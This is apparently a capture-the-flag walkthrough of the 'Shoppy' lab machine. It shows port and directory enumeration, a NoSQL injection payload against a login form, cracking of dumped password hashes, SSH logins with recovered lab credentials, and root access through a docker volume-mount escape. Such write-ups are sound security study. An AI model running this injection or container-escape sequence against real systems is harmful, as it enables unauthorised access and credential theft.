# Shoppy

## Enumerate Ports and Services

Let's do a non-ping port scan of the box
`nmap -sS -Pn 10.10.11.180` 

Output:
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

We have a web server and ssh server open on this host

DNS resolves to:
```
└─$ nmap -Pn -sT -sC 10.10.11.180
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-09 20:13 EST
Nmap scan report for 10.10.11.180
Host is up (0.0069s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA)
|   256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA)
|_  256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://shoppy.htb
```

We update this in our `/etc/hosts` file
```
10.10.11.180    shoppy.htb
```

Running gobuster, we see the following endpoints:
```
└─$ gobuster dir -u shoppy.htb -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shoppy.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/09 20:17:50 Starting gobuster in directory enumeration mode
===============================================================
/ADMIN                (Status: 302) [Size: 28] [--> /login]
/Admin                (Status: 302) [Size: 28] [--> /login]
/Login                (Status: 200) [Size: 1074]
/admin                (Status: 302) [Size: 28] [--> /login]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]
/exports              (Status: 301) [Size: 181] [--> /exports/]
/favicon.ico          (Status: 200) [Size: 213054]
/fonts                (Status: 301) [Size: 177] [--> /fonts/]
/images               (Status: 301) [Size: 179] [--> /images/]
/js                   (Status: 301) [Size: 171] [--> /js/]
/login                (Status: 200) [Size: 1074]
```

Only the `/login` endpoint is accessible

---

When we submit an HTTP POST request via the login form, we send:
```
POST /login HTTP/1.1
Host: shoppy.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://shoppy.htb
DNT: 1
Connection: keep-alive
Referer: http://shoppy.htb/login
Upgrade-Insecure-Requests: 1

username=admin&password=admin
```

Can we do command injection into the `username` or `password` params?

We can fuzz the `username` field with `ffuf`

`ffuf -u http://shoppy.htb -c -w /opt/SecLists/Fuzzing/Database/NoSQL.txt -X POST -d 'username=adminFUZZ&password=admin' -H 'Content-Type: application/x-www-form-urlencoded'

This yields a winning option of:
`admin' || 'a' == 'a`

Plugging this into the `username` field renders a full dump of the shop offerings, AND a button giving the option of `User Search`

If we plug that winning injection into the `Search` field, a button pops up which allows us to download a data export.

When we click on the button, we see a `user/pass` dump
```
[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},{"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}]
```

Trying to plug these into the `flag` field is fruitless. 
The passwords look like they are hashes

We can pass these into `crackstation.net`

And for user `josh` we get the password `remembermethisway`

Sadly, this password does not work when running `ssh josh@10.10.11.180`

---

## Subdomain Enumeration

We'll use `ffuf` again to enumerate subdomains

`ffuf -u http://shoppy.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.shoppy.htb"`

We can see that there are two items that pop up as candidates:
```
alpblog.shoppy.htb
mattermost.shoppy.htb
```

Mattermost is a common work productivity chat application, so
maybe there are some interesting conversations which leak sensitive info there!

We see a conversation between Josh and Jess where `jaeger`'s credentials are found.

Let's try these creds on `ssh` to see if we can pop a shell

`ssh jaeger@10.10.11.180`

And we get in!

We can `cat` out the `user.txt` in jaeger's folder and get the user flag!

---

## Lateral movement via password-manager

Now that we're logged in via `ssh` with user access, we want to be able to grab more user creds for lateral movement, ultimately allowing us to escalate to root.

Josh and Jess talked about a password-manager in `mattermost.shoppy.htb`.

A quick way to check `jaeger`'s user privileges is by running `sudo -l`

`sudo -l` 

We see:
```
(deploy) /home/deploy/password-manager
```

The password manager mentioned before!

If we run `sudo -u deploy /home/deploy/check-permissions` (using `sudo -u` allows us to run `sudo` as a given user), we get a prompt for a password - we don't have one yet!

Looking closer via `cat /home/deploy/check-permissions` we find a string saying:
```
Please enter password: SampleWelcome!
```

This seems to suggest that `Sample` is a valid passphrase for us. Let's run `sudo -u /home/deploy/check-permissions` again, using `Sample` as a password

```
$ /home/deploy/password-manager
Please enter password: Sample
Welcome! Credentials are:
User: deploy
Password: Sh0ppy@ppDepl0y!
```

Nice! We have another set of credentials! 
Let's see if THESE work on `ssh` from our attacker machine:

`# ssh deploy@10.10.11.180`

And we've logged in as deploy!

---

## PrivEsc with Docker

Now that we've laterally moved to `deploy`, we want to find a way to escalate to root 

Since the user name is `deploy`, this implies the use of a tool like `docker`. Let's see if we have docker installed on this machine

```
$ docker images

REPOSITORY  TAG     ...
alpine      latest  ...
```

And let's find where docker socket is at (`/run/docker.sock`?):
```
$ find / -name docker.sock 2>/dev/null
/run/docker.sock
``` 

Now, we know we can perform a privilege escalation on docker images using the Socket Escape technique 

What we'll do is spawn an interactive deployment of our `alpine` image, mounting the hard disk and chroot on it

```
$ docker run -it -v /:/host/ alpine chroot /host/ bash
root@:/#
``` 

We are now root!
```
cd /root
cat root.txt
```

We now have the root flag!
